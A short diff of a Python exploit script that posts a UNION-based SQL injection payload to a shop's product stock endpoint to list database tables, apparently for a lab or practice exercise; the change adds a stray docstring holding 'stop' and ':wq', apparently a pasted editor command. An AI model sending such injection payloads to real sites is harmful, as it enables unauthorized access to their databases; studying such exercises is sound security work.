@@ -57,6 +57,9 @@ def main(args):
     url = shop.base_url + "product/stock"
     payload = format_payload("UNION SELECT table_name from information_schema.tables")
     log.info("Sending SQLi Payload: {payload}")
+    """
+    stop
+    :wq"""
     if shop.no_proxy:
         resp = requests.post(url, data=payload)
     else:
